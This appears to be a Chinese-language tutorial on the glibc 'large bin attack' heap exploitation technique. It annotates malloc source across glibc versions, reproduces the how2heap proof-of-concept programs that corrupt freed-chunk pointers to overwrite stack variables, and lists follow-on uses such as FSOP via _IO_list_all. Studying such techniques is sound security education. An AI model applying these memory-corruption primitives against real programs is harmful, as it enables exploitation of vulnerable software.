# Large Bin Attack

分配跟 large bin 有关的 chunk，要经过 fastbin，unsorted bin，small bin 的分配，建议在学习 large bin attack 之前搞清楚 fastbin，unsorted bin 分配的流程。

large bin中双向链表的连接方法（fd\bk ---- fd_nextsize/bk_nextsize）：

![image-20240826115703878](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408261157247.png)

## large bin attack

1. 这种攻击方式主要利用的是 **chunk 进入 bin** 中的操作，在 malloc 的时候，遍历 unsorted bin 时，对每一个 chunk，若**无法 exact-fit 分配**或**不满足切割分配**的条件，就会将该 chunk 置入相应的 bin 中，而此过程中**缺乏对 largebin 的跳表指针的检测**。

2. 以 2.33 版本的 libc 为例，从 4052 行开始就是对 **largebin chunk 的入 bin** 操作,（glibc-2.29 从3839开始）：

   ```c
   else
               {
                 victim_index = largebin_index (size);
                 bck = bin_at (av, victim_index);
                 fwd = bck->fd;
   
                 /* maintain large bins in sorted order */
                 if (fwd != bck)
                   {
                     /* Or with inuse bit to speed comparisons */
                     size |= PREV_INUSE;
                     /* if smaller than smallest, bypass loop below */
                     assert (chunk_main_arena (bck->bk));
                     if ((unsigned long) (size) < (unsigned long) chunksize_nomask (bck->bk))
                       {
                         fwd = bck;
                         bck = bck->bk;
   
                         victim->fd_nextsize = fwd->fd;
                         victim->bk_nextsize = fwd->fd->bk_nextsize;
                         fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;
                       }
                     else
                       {
                         assert (chunk_main_arena (fwd));
                         while ((unsigned long) size < chunksize_nomask (fwd))
                           {
                             fwd = fwd->fd_nextsize;
                 			 assert (chunk_main_arena (fwd));
                           }
   
                         if ((unsigned long) size == (unsigned long) chunksize_nomask (fwd))
                           /* Always insert in the second position.  */
                           fwd = fwd->fd;
                         else
                           {
                             victim->fd_nextsize = fwd;
                             victim->bk_nextsize = fwd->bk_nextsize;
                             if (__glibc_unlikely (fwd->bk_nextsize->fd_nextsize != fwd))
                               malloc_printerr ("malloc(): largebin double linked list corrupted (nextsize)");
                             fwd->bk_nextsize = victim;
                             victim->bk_nextsize->fd_nextsize = victim;
                           }
                         bck = fwd->bk;
                         if (bck->fd != fwd)
                           malloc_printerr ("malloc(): largebin double linked list corrupted (bk)");
                       }
                   }
   ```
   
   在 2.29 及以下的版本中，根据 unsorted chunk 的大小不同有两种：

   * 在 **unsorted chunk 小于链表中最小的 chunk** 的时候会执行前一句，
   * 在 **unsorted chunk 不小于链表中最小的 chunk** 的时候会执行后一句：
   
   ```c
   fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;
   victim->bk_nextsize->fd_nextsize = victim;
   ```
   
   由于**两者大小相同**的时候，只会使用如下的方法插入，所以此时**无法利用**：
   
   ```c
   if ((unsigned long) size == (unsigned long) chunksize_nomask (fwd))
   	/* Always insert in the second position.  */
   	fwd = fwd->fd;
   ```
   
   所以有两种利用方法。
   
   在 2.30 版本新加入了对 **largebin 跳表的完整性检查** ，使 unsorted chunk 大于链表中最小的 chunk 时的利用失效，必须使 **unsorted chunk 小于large bin链表中最小的 chunk**，通过：
   
   ```c
   victim->bk_nextsize->fd_nextsize = victim;
   ```
   
   实现利用，也就是将本 chunk 的地址写到 `bk_nextsize + 0x20` 处。



## 通过实例学习 large bin attack 的原理

1. 这里我们拿 how2heap 中的 large bin attack 中的源码来分析：

   ```c
   // 主要漏洞在这里
   /*
   
       This technique is taken from
       https://dangokyo.me/2018/04/07/a-revisit-to-large-bin-in-glibc/
   
       [...]
   
                 else
                 {
                     victim->fd_nextsize = fwd;
                     victim->bk_nextsize = fwd->bk_nextsize;
                     fwd->bk_nextsize = victim;
                     victim->bk_nextsize->fd_nextsize = victim;
                 }
                 bck = fwd->bk;
   
       [...]
   
       mark_bin (av, victim_index);
       victim->bk = bck;
       victim->fd = fwd;
       fwd->bk = victim;
       bck->fd = victim;
   
       For more details on how large-bins are handled and sorted by ptmalloc,
       please check the Background section in the aforementioned link.
   
       [...]
   
    */
   
   // gcc large_bin_attack.c -o large_bin_attack -g
   #include <stdio.h>
   #include <stdlib.h>
   
   int main()
   {
       fprintf(stderr, "This file demonstrates large bin attack by writing a large unsigned long value into stack\n");
       fprintf(stderr, "In practice, large bin attack is generally prepared for further attacks, such as rewriting the "
                       "global variable global_max_fast in libc for further fastbin attack\n\n");
   
       unsigned long stack_var1 = 0;
       unsigned long stack_var2 = 0;
   
       fprintf(stderr, "Let's first look at the targets we want to rewrite on stack:\n");
       fprintf(stderr, "stack_var1 (%p): %ld\n", &stack_var1, stack_var1);
       fprintf(stderr, "stack_var2 (%p): %ld\n\n", &stack_var2, stack_var2);
   
       unsigned long *p1 = malloc(0x320);
       fprintf(stderr, "Now, we allocate the first large chunk on the heap at: %p\n", p1 - 2);
   
       fprintf(stderr, "And allocate another fastbin chunk in order to avoid consolidating the next large chunk with"
                       " the first large chunk during the free()\n\n");
       malloc(0x20);
   
       unsigned long *p2 = malloc(0x400);
       fprintf(stderr, "Then, we allocate the second large chunk on the heap at: %p\n", p2 - 2);
   
       fprintf(stderr, "And allocate another fastbin chunk in order to avoid consolidating the next large chunk with"
                       " the second large chunk during the free()\n\n");
       malloc(0x20);
   
       unsigned long *p3 = malloc(0x400);
       fprintf(stderr, "Finally, we allocate the third large chunk on the heap at: %p\n", p3 - 2);
   
       fprintf(stderr, "And allocate another fastbin chunk in order to avoid consolidating the top chunk with"
                       " the third large chunk during the free()\n\n");
       malloc(0x20);
   
       free(p1);
       free(p2);
       fprintf(stderr, "We free the first and second large chunks now and they will be inserted in the unsorted bin:"
                       " [ %p <--> %p ]\n\n",
               (void *)(p2 - 2), (void *)(p2[0]));
   
       void* p4 = malloc(0x90);
       fprintf(stderr, "Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the"
                       " freed second large chunk into the large bin freelist, use parts of the freed first large chunk for allocation"
                       ", and reinsert the remaining of the freed first large chunk into the unsorted bin:"
                       " [ %p ]\n\n",
               (void *)((char *)p1 + 0x90));
   
       free(p3);
       fprintf(stderr, "Now, we free the third large chunk and it will be inserted in the unsorted bin:"
                       " [ %p <--> %p ]\n\n",
               (void *)(p3 - 2), (void *)(p3[0]));
   
       //------------VULNERABILITY-----------
   
       fprintf(stderr, "Now emulating a vulnerability that can overwrite the freed second large chunk's \"size\""
                       " as well as its \"bk\" and \"bk_nextsize\" pointers\n");
       fprintf(stderr, "Basically, we decrease the size of the freed second large chunk to force malloc to insert the freed third large chunk"
                       " at the head of the large bin freelist. To overwrite the stack variables, we set \"bk\" to 16 bytes before stack_var1 and"
                       " \"bk_nextsize\" to 32 bytes before stack_var2\n\n");
   
       p2[-1] = 0x3f1;
       p2[0] = 0;
       p2[2] = 0;
       p2[1] = (unsigned long)(&stack_var1 - 2);
       p2[3] = (unsigned long)(&stack_var2 - 4);
   
       //------------------------------------
   
       malloc(0x90);
   
       fprintf(stderr, "Let's malloc again, so the freed third large chunk being inserted into the large bin freelist."
                       " During this time, targets should have already been rewritten:\n");
   
       fprintf(stderr, "stack_var1 (%p): %p\n", &stack_var1, (void *)stack_var1);
       fprintf(stderr, "stack_var2 (%p): %p\n", &stack_var2, (void *)stack_var2);
   
       return 0;
   }
   ```

   断点在这里：
   
   ![image-20240724185742596](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407241900848.png)
   
   由于刚 free() 掉了两个 chunk。现在的 **unsorted bin 有两个空闲的 chunk** ： 
   
   ![image-20240724185934115](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407241859512.png)
   
   ![image-20240724190415719](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407241904798.png)
   
   要注意的是：p1 的大小是 `0x330 < 0x3f0(small bin范围0x80~0x3f0)` 大小**属于 small bin**，而 p2 的大小是 `0x410` **属于 large bin** 。
   
   ![image-20240724190949823](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407241909872.png)
   
   62 行做了很多事情，我来概述一下：
   
   * 从 unsorted bin 中拿出最后一个 chunk（p1 属于 **small bin** 的范围）
   * 把这个 **chunk 放入 small bin** 中，并标记这个 small bin 有空闲的 chunk
   * 再从 unsorted bin 中拿出最后一个 chunk（p2 属于 **large bin** 的范围）
   * 把这个 **chunk 放入 large bin** 中，并标记这个 large bin 有空闲的 chunk
   * 现在 unsorted bin 为空，从 small bin (p1)中分配一个小的 chunk 满足请求 0x90，并把**剩下的 chunk(0x330 - 0xa0 = 0x290)放入 unsorted bin 中** 。
   
   现在：
   
   **unsorted bin** 中有一个 chunk 大小是 `0x330 - 0xa0 = 0x290`
   
   **large bin** 某一个序列的 bin 中有一个 chunk 大小是 `0x410` 
   
   ![image-20240724191501165](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408261748739.png)
   
   继续调试：
   
    free 了一个大小为 0x410 的 large bin chunk。也就是说现在 unsorted bin 有两个空闲的 chunk，**末尾是大小 `0x290` 大小的 chunk**，**第一个是 size 为 `0x410` 的 chunk**：
   
   ![image-20240724210148224](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407242101591.png)
   
   接着开始 **构造** ：
   
   ![image-20240725182903433](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407251829502.png)
   
   修改 p2（large bin chunk），修改结果如下：
   
   修改前：
   
   ![image-20240724210723812](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407242107883.png)
   
   修改后：
   
   ![image-20240725211211739](C:\Users\BKBQWQ\AppData\Roaming\Typora\typora-user-images\image-20240725211211739.png)
   
   ![image-20240724210630933](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407242106987.png)
   
   再来看看`malloc(0x90)`做了什么，中间的过程概述一下：
   
   与第一次 `malloc(0x90)` 过程类似：
   
   * 从 unsorted bin 中拿出最后一个 chunk（size = 0x290），放入 small bin 中，标记该序列的 small bin 有空闲 chunk
   * 再从 unsorted bin 中拿出最后一个 chunk（size = 0x410）
   
   ![image-20240724210852161](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407242108201.png)
   
   ![image-20240724211144512](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407242111567.png)
   
   **重点来了** ：由于这次拿的是属于 **large bin chunk**，进入了 else 分支：
   
   ![image-20240724211219130](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407242112188.png)
   
   我们继续：
   
   ![image-20240724211515457](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407242115518.png)
   
   在一个序列的 large bin chunk 中 **fd_nextsize 的方向是 size 变小的方向**。这个循环的意思是 **找到一个比当前 fwd 指的 chunk 要大的地址** ，存入 fwd 中。
   
   由于当前 fwd 的 size 被我们修改过 =`0x3f0`，所以**没有进入循环**。在这里就有一个漏洞的限制，放在后面说。
   
   ![image-20240724211711110](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407242117164.png)
   
   这个原本的意思是把**从 unsorted bin 中来的 chunk 插入这个序列中**，但是这里没有检查合法性。这里存在这一个利用：
   
   ![Screenshot_2024_0725_191949](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407251920032.png)
   
   * 之前做的构造，把 fwd 的 bk_nextsize 指向了另一个地址
   
   ```c
   victim->bk_nextsize = fwd->bk_nextsize (addr2)
   // then
   victim->bk_nextsize->fd_nextsize = victim;
   ```
   
   * 也就是：
   
   ```c
   addr2->fd_nextsize = victim;
   // 等价于
   *(addr2+4) = victim;	(任意地址写入一个堆地址)
   ```
   
   所以修改了 `stack_var2` 的值。
   
   接着还存着另外一个利用：
   
   ```c
   bck = fwd->bk;	(bkc=addr2)
   // ......
   mark_bin (av, victim_index);
   victim->bk = bck;
   victim->fd = fwd;
   fwd->bk = victim;
   bck->fd = victim;	(*(addr2+0x10)=victim,任意地址写入一个堆地址)
   ```
   
   ```c
   bck->fd = victim;
   // 等价于
   (fwd->bk)->fd = victim;
   // 等价于
   *(addr1+2) = victim;	
   ```
   
   修改了 `stack_var1` 的值，至此利用完毕。由于最后**分配的还是 small bin 中的 chunk**，与 large bin 中的 chunk 也无关了。



## glibc-2.29 源码调试large bin attack

1. glibc-2.29下，large bin attack利用的漏洞，两个利用位置，将unsorted bin中释放进入large bin的chunk称为victim，源码中的size就是指victim的size：

   * 当size**小于**对应**large bin中最小的chunk**时，利用下面这段程序完成攻击：

     ```c
     fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim; // 更新链首的bk_nextsize和原先最小chunk的fd_nextsize
     ```

   * 当size**大于**对应**large bin中的最小chunk**，且**size不等于链中任意一个chunk**时，利用：

     ```c
     victim->bk_nextsize->fd_nextsize = victim; // large bin attack攻击使用的位置
     ```

     

   ```c
         /* place chunk in bin */
         // 放入对应的small bin或是large bin中
         if (in_smallbin_range(size))
         {
           victim_index = smallbin_index(size);
           bck = bin_at(av, victim_index);
           fwd = bck->fd;
         }
         else // 放入large bin中
         {
           victim_index = largebin_index(size);
           bck = bin_at(av, victim_index);
           fwd = bck->fd; // 链首 -- size最大的chunk
   
           /* maintain large bins in sorted order */ // 要保持large bin中的chunk是按序排列的
           if (fwd != bck)                           // 如果对应的large bin不是空的，就需要排序
           {
             /* Or with inuse bit to speed comparisons */
             size |= PREV_INUSE;
             /* if smaller than smallest, bypass loop below */
             assert(chunk_main_arena(bck->bk));
             if ((unsigned long)(size) < (unsigned long)chunksize_nomask(bck->bk)) // 因为最小的chunk一直都在当前链的最后面
             {
               fwd = bck;
               bck = bck->bk; // 链尾 -- 最小的chunk
   
               victim->fd_nextsize = fwd->fd;                                    // 链首 -- size最大的chunk
               victim->bk_nextsize = fwd->fd->bk_nextsize;                       // 原先最小的chunk
               fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim; // 更新链首的bk_nextsize和原先最小chunk的fd_nextsize
             }
             else
             {
               assert(chunk_main_arena(fwd));
               while ((unsigned long)size < chunksize_nomask(fwd)) // 从链首，即最大的chunk开始比较size大小，找到第一个比它size大的chunk
               {
                 fwd = fwd->fd_nextsize; // 用fd_nextsize更新，fd_nextsiz默认指向size更小的chunk(不会重复比较size相同的chunk)
                 assert(chunk_main_arena(fwd));
               }
   
               if ((unsigned long)size == (unsigned long)chunksize_nomask(fwd)) // 如果找到的size相同，直接插入fd/bk_nextsize字段不用修改
                 /* Always insert in the second position.  */
                 fwd = fwd->fd;
               else // 如果victim的size大于找到的chunk(fwd)，就要修改fd/bk_nextsize
               {
                 victim->fd_nextsize = fwd;
                 victim->bk_nextsize = fwd->bk_nextsize; // large bin attack前修改了fwd->bk_nextsize
                 fwd->bk_nextsize = victim;
                 victim->bk_nextsize->fd_nextsize = victim; // large bin attack攻击使用的位置
               }
               bck = fwd->bk;
             }
           }
           else // 对应的large bin 是空的，直接放入，不需要排序，fd/bk_nextsize都直接指向自己
             victim->fd_nextsize = victim->bk_nextsize = victim;
         }
   
         mark_bin(av, victim_index); // 开始插入到bck和fwd之间
         victim->bk = bck;
         victim->fd = fwd;
         fwd->bk = victim;
         bck->fd = victim;
   
   ```

2. 调试源码：

   ```c
   #include<stdio.h>
   #include<stdlib.h>
   #include<assert.h>
   
   int main()
   {
       setbuf(stdout, NULL);
   
       printf("本文件演示了通过将一个大的无符号长值写入栈上的large bin攻击\n");
       printf("实际上，large bin攻击通常为进一步的攻击做准备，例如重写libc中的全局变量global_max_fast以进行进一步的fastbin攻击\n\n");
   
       unsigned long stack_var1 = 0;
       unsigned long stack_var2 = 0;
   
       printf("首先，我们看看要在栈上重写的目标：\n");
       printf("stack_var1 (%p): %ld\n", &stack_var1, stack_var1);
       printf("stack_var2 (%p): %ld\n\n", &stack_var2, stack_var2);
   
       unsigned long *p1 = malloc(0x420);
       printf("现在，我们在堆上分配第一个大块：%p\n", p1 - 2);
   
       printf("再分配另一个fastbin块，以避免在free()期间将下一个大块与第一个大块合并\n\n");
       malloc(0x20);
   
       unsigned long *p2 = malloc(0x500);
       printf("然后，我们在堆上分配第二个大块：%p\n", p2 - 2);
   
       printf("再分配另一个fastbin块，以避免在free()期间将下一个大块与第二个大块合并\n\n");
       malloc(0x20);
   
       unsigned long *p3 = malloc(0x500);
       printf("最后，我们在堆上分配第三个大块：%p\n", p3 - 2);
   
       printf("再分配另一个fastbin块，以避免在free()期间将第三个大块与top块合并\n\n");
       malloc(0x20);
   
       free(p1);
       free(p2);
       printf("现在我们释放第一个和第二个大块，它们将被插入到unsorted bin中："
              " [ %p <--> %p ]\n\n", (void *)(p2 - 2), (void *)(p2[0]));
   
       malloc(0x90);
       printf("现在，我们分配一个比已释放的第一个大块小的块。这将把已释放的第二个大块移到large bin空闲列表中，"
              "使用已释放的第一个大块的一部分进行分配，并将剩余的第一个大块重新插入到unsorted bin中："
              " [ %p ]\n\n", (void *)((char *)p1 + 0x90));
   
       free(p3);
       printf("现在，我们释放第三个大块，它将被插入到unsorted bin中："
              " [ %p <--> %p ]\n\n", (void *)(p3 - 2), (void *)(p3[0]));
   
       // ------------漏洞模拟-----------
   
       printf("现在模拟一个漏洞，可以覆盖已释放的第二个大块的“size”以及它的“bk”和“bk_nextsize”指针\n");
       printf("基本上，我们减少已释放的第二个大块的大小，以强制malloc在large bin空闲列表的头部插入已释放的第三个大块。"
              "为了覆盖栈变量，我们将“bk”设置为stack_var1之前的16字节，将“bk_nextsize”设置为stack_var2之前的32字节\n\n");
   
       p2[-1] = 0x3f1;
       p2[0] = 0;
       p2[2] = 0;
       p2[1] = (unsigned long)(&stack_var1 - 2);
       p2[3] = (unsigned long)(&stack_var2 - 4);
   
       // --------------------------------
   
       printf("让我们再分配一次，这样已释放的第三个大块就会被插入到large bin空闲列表中。"
              "此时，目标应该已经被重写：\n");        
       malloc(0x90);
   
       printf("stack_var1 (%p): %p\n", &stack_var1, (void *)stack_var1);
       printf("stack_var2 (%p): %p\n", &stack_var2, (void *)stack_var2);
   
       return 0;
   }
   ```

3. 调试，这里仅在最后申请malloc(0x90)触发large bin attack时，进入_int_malloc源码调试。且利用的时第二种方法：

   初始时堆上的状态，原先large bin已经被修改，bk_nextsize指向0x00007fffffffde18，bk指向0x00007fffffffde30：

   ![image-20240826152552472](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408261525709.png)

   调试，进入到_int_malloc中对unsorted bin处理的部分，这里处理unsorted bin中的第一个chunk（unsorted bin在处理时使用bk寻址，但是dbg中按fd显示了），这里将chunk移出unsorted bin：

   ![image-20240826153021994](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408261530255.png)

   ![image-20240826153859594](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408261538742.png)

   将取出的victim放入对应的small bin中：

   ![image-20240826154011296](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408261540564.png)

   ![image-20240826154056117](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408261540434.png)![image-20240826160018780](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408261600867.png)

   

4. 下面处理unsorted bin 中的第二个chunk，即large bin，可以看到victim的size是**大于large bin中最小的chunk的size**，且不相等：

   ![image-20240826154249440](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408261542875.png)

   任然是**先从unsorted bin中移除**：

   ![image-20240826154511133](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408261545407.png)![image-20240826154548836](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408261545951.png)

   然后，进入到large bin的处理流程：

   先找到对应large bin的链首的chunk，即size最大的chunk（fwd）：

   ![image-20240826154735606](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408261547865.png)

   比较victm的size和该large bin中最小size的chunk，这里很明显不满足，所以跳到else处理：

   ![image-20240826155045678](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408261550995.png)

   下面就在该large bin中寻找一个chunk，该size要大于或等于victim的size。从链首的fwd(size最大的chunk)开始寻找，**fd_nextsize默认指向size较小的chunk**：

   ![image-20240826155231800](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408261552071.png)

   下面直接看大于victim的size的情况：

   ![image-20240826155841829](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408261603903.png)

   所以addr+0x20的位置写上了当前victim的地址：

   ![image-20240826160330876](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408261603083.png)

   

   后面就是正常修改fd和bk指针，将victim链入到对应的large bin中，并且需要满足排序的要求(由大到小)，所以插入在bck（通过fwd的bk指针，找到size大于victim的chunk）和fwd（while循环中找到的第一个size比victim小的chunk）之间，bck->victim->fwd。前面覆盖了fwd的bk指针（addr'），所以最后会向addr'+0x10写入victim的地址。

   ![image-20240826161131197](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408261611511.png)

   ![image-20240826161439130](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408261614291.png)

   

5. 总结：在将unsorted bin中的chunk移植到large bin中时，**对large bin中的chunk** 是没有任何检查的，只有在**unsorted bin 中的chunk取出** 时做了完整性检查，但是large bin attack 并不用修改unsorted bin，所以检查必然通过

## glibc-2.31 源码调试large bin attack

1. large bin attack利用的漏洞，一个利用位置，将unsorted bin中释放进入large bin的chunk称为victim，源码中的size就是指victim的size：

   * 通过源码看到，当unsorted bin中取出的victim的size**不小于**对应large bin中最小的chunk时，相当于在large bin链的中间段插入，检查相当严格。

   * 所以只能利用unsorted bin中的victim的size **小于对应large bin中最小的chunk**  ，但是**一次性**只能写入**一个堆地址**：

     ```c
     fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize= victim;
     ```

     

   ```c
   	  else
   	    {
   	      victim_index = largebin_index (size);
   	      bck = bin_at (av, victim_index); // bck为main_arena_x地址
   	      fwd = bck->fd;
   
   	      /* maintain large bins in sorted order */
   	      if (fwd != bck)
   		{
   		  /* Or with inuse bit to speed comparisons */
   		  size |= PREV_INUSE;
   		  /* if smaller than smallest, bypass loop below */
   		  assert (chunk_main_arena (bck->bk));
   		  if ((unsigned long) (size)
   		      < (unsigned long) chunksize_nomask (
   			  bck->bk)) // 小于对应large bin中最小的chunk，相当于在尾部插入
   		    {
   		      fwd = bck;
   		      bck = bck->bk; // 直接通过main_arena中的地址拿到,不是通过原large bin中伪造的bk拿到
   
   		      victim->fd_nextsize = fwd->fd;// victim是新的最小chunk，最小的chunk的fd_nextsize，要指向size最大的chunk
   		      victim->bk_nextsize = fwd->fd->bk_nextsize;// fwd->fd->bk_nextsize是原链中最小size的chunk，排在victim前面
   		      fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize
   			  = victim;
   		    }
   		  else // 大于或等于对应large bin中最小的chunk，相当于在large bin链的中间插入
   		    {
   		      assert (chunk_main_arena (fwd));
   		      while ((unsigned long) size < chunksize_nomask (fwd))
                   {
                     fwd = fwd->fd_nextsize;
                     assert (chunk_main_arena (fwd));
                   }
   
   		      if ((unsigned long) size == (unsigned long) chunksize_nomask (fwd))
                       /* Always insert in the second position.  */
                       fwd = fwd->fd;
   		      else
                   {
                     victim->fd_nextsize = fwd;
                     victim->bk_nextsize = fwd->bk_nextsize;
                     if (__glibc_unlikely (fwd->bk_nextsize->fd_nextsize!= fwd)) // 覆盖fwd的bk_nextsize之前，对其进行跳表完整性检查，通过才能覆盖fwd->bk_nextsize
                       malloc_printerr ("malloc(): largebin double linked list "
                       "corrupted (nextsize)");
                     fwd->bk_nextsize = victim;
                     victim->bk_nextsize->fd_nextsize = victim;
                   }
   		      bck = fwd->bk;
   		      if (bck->fd != fwd) // 中间段large bin的完整性检查，后面要在bck和fwd之间插入victim
   				malloc_printerr ("malloc(): largebin double linked list corrupted (bk)");
   		    }
   		}
   	      else
   		victim->fd_nextsize = victim->bk_nextsize = victim;
   	    }
   
   	  mark_bin (av, victim_index);
   	  victim->bk = bck; // 正常的插入流程
   	  victim->fd = fwd;
   	  fwd->bk = victim;
   	  bck->fd = victim;
   ```
   
2. 先看victim的size大于large bin中最小chunk时，有检查的情况，这里直接快进到检查位置：

   fwd->bk_nextsize被我们覆盖成了addr，所以检查必然不能通过，会在这里报错退出：

   ![image-20240826164539527](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408261645942.png)

3. 下面看一下另外一条路径，调试源码如下：

   ```c
   #include<stdio.h>
   #include<stdlib.h>
   #include<assert.h>
   
   int main()
   {
       setbuf(stdout, NULL);
   
       printf("本文件演示了通过将一个大的无符号长值写入栈上的large bin攻击\n");
       printf("实际上，large bin攻击通常为进一步的攻击做准备，例如重写libc中的全局变量global_max_fast以进行进一步的fastbin攻击\n\n");
   
       unsigned long stack_var1 = 0;
       unsigned long stack_var2 = 0;
   
       printf("首先，我们看看要在栈上重写的目标：\n");
       printf("stack_var1 (%p): %ld\n", &stack_var1, stack_var1);
       printf("stack_var2 (%p): %ld\n\n", &stack_var2, stack_var2);
   
       unsigned long *p1 = malloc(0x420);
       printf("现在，我们在堆上分配第一个大块：%p\n", p1 - 2);
   
       printf("再分配另一个fastbin块，以避免在free()期间将下一个大块与第一个大块合并\n\n");
       malloc(0x20);
   
       unsigned long *p2 = malloc(0x500);
       printf("然后，我们在堆上分配第二个大块：%p\n", p2 - 2);
   
       printf("再分配另一个fastbin块，以避免在free()期间将下一个大块与第二个大块合并\n\n");
       malloc(0x20);
   
       unsigned long *p3 = malloc(0x500-8);
       printf("最后，我们在堆上分配第三个大块：%p\n", p3 - 2);
   
       printf("再分配另一个fastbin块，以避免在free()期间将第三个大块与top块合并\n\n");
       malloc(0x20);
   
       free(p1);
       free(p2);
       printf("现在我们释放第一个和第二个大块，它们将被插入到unsorted bin中："
              " [ %p <--> %p ]\n\n", (void *)(p2 - 2), (void *)(p2[0]));
   
       malloc(0x90);
       printf("现在，我们分配一个比已释放的第一个大块小的块。这将把已释放的第二个大块移到large bin空闲列表中，"
              "使用已释放的第一个大块的一部分进行分配，并将剩余的第一个大块重新插入到unsorted bin中："
              " [ %p ]\n\n", (void *)((char *)p1 + 0x90));
   
       free(p3);
       printf("现在，我们释放第三个大块，它将被插入到unsorted bin中："
              " [ %p <--> %p ]\n\n", (void *)(p3 - 2), (void *)(p3[0]));
   
       // ------------漏洞模拟-----------
   
       printf("现在模拟一个漏洞，可以覆盖已释放的第二个大块的“size”以及它的“bk”和“bk_nextsize”指针\n");
       printf("基本上，我们减少已释放的第二个大块的大小，以强制malloc在large bin空闲列表的头部插入已释放的第三个大块。"
              "为了覆盖栈变量，我们将“bk”设置为stack_var1之前的16字节，将“bk_nextsize”设置为stack_var2之前的32字节\n\n");
   
       p2[0] = 0;
       p2[2] = 0;
       p2[1] = (unsigned long)(&stack_var1 - 2);
       p2[3] = (unsigned long)(&stack_var2 - 4);
   
       // --------------------------------
   
       printf("让我们再分配一次，这样已释放的第三个大块就会被插入到large bin空闲列表中。"
              "此时，目标应该已经被重写：\n");
         
       malloc(0x90);
       printf("stack_var1 (%p): %p\n", &stack_var1, (void *)stack_var1);
       printf("stack_var2 (%p): %p\n", &stack_var2, (void *)stack_var2);
       return 0;
   }
   ```

4. 任然快进到_int_malloc中对large bin的处理部分：

   先看一下攻击前，堆上的内容：

   ![image-20240826170657874](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408261706316.png)

   进入large bin的处理部分（前面对small bin的处理跳过）：

   任然先找到对应large bin的链首（size最大的chunk）

   ![image-20240826171051951](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408261710286.png)

   于large bin中最小的chunk比大小，通过：

   ![image-20240826171207253](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408261712634.png)

   随后向fwd->fd->bk_nextsize 写入victim地址：

   ![image-20240826172322152](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408261723593.png)

   ![image-20240826172419360](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408261724530.png)

   最后向large bin链入victim，任然是插入在bck和fwd之间，这里**没有写入第二个地址** ，因为这里的bck不是通过fwd的bk指针找到的，所以此时的bck是正常large bin中的chunk：

   ![image-20240826174452418](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408261744544.png)

   ![image-20240826174607002](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408261746506.png)

   

5. 总结：使在unsorted bin中取出的victim的size **小于** 对应**large bin中最小size的chunk**即可，对large bin任然没有任何检查。



## 总结 large bin attack 的利用方法

1. how2heap 中也说了，large bin attack 是未来更深入的利用（在IO中利用其能写入堆地址）。现在我们来总结一下利用的条件：
   - 可以修改一个 large bin chunk 的 data
   - 从 unsorted bin 中来的 large bin chunk 要紧跟在**被构造过的 chunk 的后面** 
   - 通过 large bin attack 可以**辅助 Tcache Stash Unlink + 攻击** （任意地址写入一个**堆地址**后可以达成Tcache Stash Unlink的部分利用条件 ==> 在 `fake_chunk_addr->bk` 处提前写一个**可写地址** `writable_addr` ）
   - 可以修改 _IO_list_all 便于伪造 _IO_FILE 结构体进行 FSOP。
2. 达成的效果：向地址addr，写入当前unsorted bin中拿出的victim堆地址
   * 将large bin中的chunk的**bk_nextsize**覆盖为 **addr-0x20** （并且addr不需要考内存对齐的为题）。
